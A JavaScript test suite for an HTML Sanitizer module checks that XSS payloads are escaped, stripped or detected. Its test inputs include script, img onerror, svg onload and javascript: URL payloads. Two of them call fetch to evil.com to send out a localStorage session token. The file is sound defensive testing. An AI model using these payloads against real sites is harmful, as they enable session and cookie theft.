/**
 * Tests for Sanitizer XSS protection
 * Ensures user-controlled content cannot execute malicious scripts
 */
import { Sanitizer } from '../app/core/Sanitizer.js';

describe('Sanitizer', () => {
  describe('escapeHTML', () => {
    it('should escape basic HTML entities', () => {
      const input = '<script>alert("XSS")</script>';
      const result = Sanitizer.escapeHTML(input);

      expect(result).not.toContain('<script>');
      expect(result).toContain('&lt;script&gt;');
      // Quotes are escaped but "alert" text itself is preserved
      expect(result).toContain('alert(&quot;XSS&quot;)');
    });

    it('should escape all dangerous characters', () => {
      const input = '& < > " \'';
      const result = Sanitizer.escapeHTML(input);

      // Check that entities are escaped
      expect(result).toContain('&amp;');
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
      expect(result).toContain('&quot;');
      expect(result).toContain('&#39;');
      // Original characters should not appear unescaped (regex check)
      expect(result).not.toMatch(/[<>]/); // No unescaped < or >
    });

    it('should handle img tags with onerror', () => {
      const input = '<img src=x onerror=alert(1)>';
      const result = Sanitizer.escapeHTML(input);

      expect(result).toContain('&lt;img');
      // Check that the tag is fully escaped (no unescaped < or >)
      expect(result).not.toMatch(/<img/);
    });

    it('should escape sophisticated XSS payloads', () => {
      const payloads = [
        '<img src=x onerror="fetch(\'https://evil.com/steal?token=\' + localStorage.getItem(\'session\'))">',
        '<svg/onload=alert(document.cookie)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
      ];

      payloads.forEach(payload => {
        const result = Sanitizer.escapeHTML(payload);
        expect(result).not.toMatch(/<\w+/); // No unescaped opening tags
        // The text "javascript:", "onerror", etc. will be preserved but HTML-safe
        expect(result).not.toMatch(/<[^&]/); // No unescaped < followed by non-&
      });
    });

    it('should handle non-string input gracefully', () => {
      expect(Sanitizer.escapeHTML(null)).toBe('');
      expect(Sanitizer.escapeHTML(undefined)).toBe('');
      expect(Sanitizer.escapeHTML(123)).toBe('');
      expect(Sanitizer.escapeHTML({})).toBe('');
      expect(Sanitizer.escapeHTML([])).toBe('');
    });

    it('should preserve safe text content', () => {
      const input = 'Hello World! This is safe text.';
      const result = Sanitizer.escapeHTML(input);

      expect(result).toBe(input);
    });

    it('should handle empty strings', () => {
      expect(Sanitizer.escapeHTML('')).toBe('');
    });
  });

  describe('sanitizeHTML', () => {
    it('should allow whitelisted tags', () => {
      const input = '<strong>Bold</strong> and <em>italic</em>';
      const result = Sanitizer.sanitizeHTML(input);

      expect(result).toContain('<strong>');
      expect(result).toContain('</strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('</em>');
    });

    it('should remove non-whitelisted tags but keep content', () => {
      const input = '<script>alert(1)</script><div>Hello</div><strong>World</strong>';
      const result = Sanitizer.sanitizeHTML(input);

      expect(result).not.toContain('<script>');
      expect(result).not.toContain('<div>');
      expect(result).toContain('alert(1)'); // Content preserved
      expect(result).toContain('Hello');
      expect(result).toContain('<strong>World</strong>');
    });

    it('should remove dangerous attributes', () => {
      const input = '<strong onclick="alert(1)" class="safe" data-evil="bad">Text</strong>';
      const result = Sanitizer.sanitizeHTML(input);

      expect(result).not.toContain('onclick');
      expect(result).not.toContain('data-evil');
      expect(result).toContain('class="safe"'); // Safe attribute preserved
    });

    it('should handle custom allowed tags', () => {
      const input = '<div>Div content</div><span>Span content</span>';
      const result = Sanitizer.sanitizeHTML(input, ['div', 'span']);

      expect(result).toContain('<div>');
      expect(result).toContain('<span>');
    });

    it('should strip javascript: URLs', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const result = Sanitizer.sanitizeHTML(input, ['a']);

      // 'a' tag is allowed with custom whitelist but href is stripped
      expect(result).toContain('<a'); // Tag is allowed
      expect(result).not.toContain('href'); // href attribute is stripped (not in safe list)
      expect(result).toContain('Click'); // Content preserved
    });

    it('should handle nested tags correctly', () => {
      const input = '<strong><em>Nested</em></strong>';
      const result = Sanitizer.sanitizeHTML(input);

      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('Nested');
    });

    it('should handle non-string input gracefully', () => {
      expect(Sanitizer.sanitizeHTML(null)).toBe('');
      expect(Sanitizer.sanitizeHTML(undefined)).toBe('');
      expect(Sanitizer.sanitizeHTML(123)).toBe('');
    });
  });

  describe('createSafeElement', () => {
    it('should create element with escaped text content', () => {
      const text = '<script>alert(1)</script>';
      const el = Sanitizer.createSafeElement('div', text, 'test-class');

      expect(el.tagName).toBe('DIV');
      expect(el.textContent).toBe(text); // textContent doesn't parse HTML
      expect(el.className).toBe('test-class');
      expect(el.innerHTML).not.toContain('<script>'); // HTML is escaped
    });

    it('should create element without className if not provided', () => {
      const el = Sanitizer.createSafeElement('span', 'Hello');

      expect(el.tagName).toBe('SPAN');
      expect(el.textContent).toBe('Hello');
      expect(el.className).toBe('');
    });

    it('should prevent XSS in text content', () => {
      const xssPayload = '<img src=x onerror=alert(1)>';
      const el = Sanitizer.createSafeElement('p', xssPayload);

      // Verify that textContent prevents execution
      expect(el.textContent).toBe(xssPayload);
      expect(el.querySelector('img')).toBeNull(); // No img element created
    });
  });

  describe('isHTMLFree', () => {
    it('should return true for text without HTML', () => {
      expect(Sanitizer.isHTMLFree('Hello World')).toBe(true);
      expect(Sanitizer.isHTMLFree('Just plain text')).toBe(true);
      expect(Sanitizer.isHTMLFree('Text with numbers 123')).toBe(true);
    });

    it('should return false for text with HTML tags', () => {
      expect(Sanitizer.isHTMLFree('<div>Text</div>')).toBe(false);
      expect(Sanitizer.isHTMLFree('<script>alert(1)</script>')).toBe(false);
      expect(Sanitizer.isHTMLFree('Text <strong>bold</strong>')).toBe(false);
      expect(Sanitizer.isHTMLFree('<img src=x>')).toBe(false);
    });

    it('should handle edge cases', () => {
      expect(Sanitizer.isHTMLFree('')).toBe(true);
      expect(Sanitizer.isHTMLFree('Text < 5 and > 3')).toBe(false); // Contains < and >
      expect(Sanitizer.isHTMLFree('Text with "quotes"')).toBe(true);
    });

    it('should return true for non-string input', () => {
      expect(Sanitizer.isHTMLFree(null)).toBe(true);
      expect(Sanitizer.isHTMLFree(undefined)).toBe(true);
      expect(Sanitizer.isHTMLFree(123)).toBe(true);
      expect(Sanitizer.isHTMLFree({})).toBe(true);
    });
  });

  describe('Real-world XSS attack scenarios', () => {
    it('should prevent tool config XSS attack', () => {
      const maliciousToolConfig = {
        id: 'evil-tool',
        name: '<img src=x onerror=alert(document.cookie)>',
        description: '<script>fetch("https://evil.com/steal?token=" + localStorage.getItem("session"))</script>'
      };

      const safeName = Sanitizer.escapeHTML(maliciousToolConfig.name);
      const safeDesc = Sanitizer.escapeHTML(maliciousToolConfig.description);

      // Check that tags are escaped (no unescaped < or >)
      expect(safeName).not.toMatch(/<img/);
      expect(safeDesc).not.toMatch(/<script/);
      // Verify escaping worked
      expect(safeName).toContain('&lt;');
      expect(safeDesc).toContain('&lt;');
    });

    it('should prevent notification message XSS', () => {
      const maliciousMessage = '<img src=x onerror="alert(\'XSS in notification\')"/>';

      // Using textContent (safe)
      const messageSpan = document.createElement('span');
      messageSpan.textContent = maliciousMessage;

      expect(messageSpan.querySelector('img')).toBeNull();
      expect(messageSpan.textContent).toBe(maliciousMessage);
    });

    it('should prevent update banner XSS', () => {
      const maliciousUpdate = {
        version: '1.0.0<script>alert(1)</script>',
        channel: 'beta" onload="alert(2)'
      };

      const safeVersion = Sanitizer.escapeHTML(maliciousUpdate.version);
      const safeChannel = Sanitizer.escapeHTML(maliciousUpdate.channel);

      expect(safeVersion).not.toMatch(/<script/);
      // Quotes and dangerous chars are escaped
      expect(safeChannel).toContain('&quot;');
    });

    it('should detect HTML in tool config validation', () => {
      const configs = [
        { name: 'Safe Tool', description: 'Safe description' },
        { name: '<script>alert(1)</script>', description: 'Bad' },
        { name: 'Safe', description: '<img src=x onerror=alert(1)>' }
      ];

      const results = configs.map(cfg => ({
        name: cfg.name,
        isNameSafe: Sanitizer.isHTMLFree(cfg.name),
        isDescSafe: Sanitizer.isHTMLFree(cfg.description)
      }));

      expect(results[0].isNameSafe).toBe(true);
      expect(results[0].isDescSafe).toBe(true);

      expect(results[1].isNameSafe).toBe(false);
      expect(results[1].isDescSafe).toBe(true);

      expect(results[2].isNameSafe).toBe(true);
      expect(results[2].isDescSafe).toBe(false);
    });
  });

  describe('Performance', () => {
    it('should handle large strings efficiently', () => {
      const largeString = 'a'.repeat(100000);
      const start = Date.now();

      const result = Sanitizer.escapeHTML(largeString);

      const duration = Date.now() - start;

      expect(result).toBe(largeString);
      expect(duration).toBeLessThan(1000); // Should complete in < 1 second
    });

    it('should handle many tags efficiently', () => {
      const manyTags = Array(1000).fill('<div>Text</div>').join('');
      const start = Date.now();

      const result = Sanitizer.escapeHTML(manyTags);

      const duration = Date.now() - start;

      expect(result).not.toContain('<div>');
      expect(duration).toBeLessThan(1000);
    });
  });
});
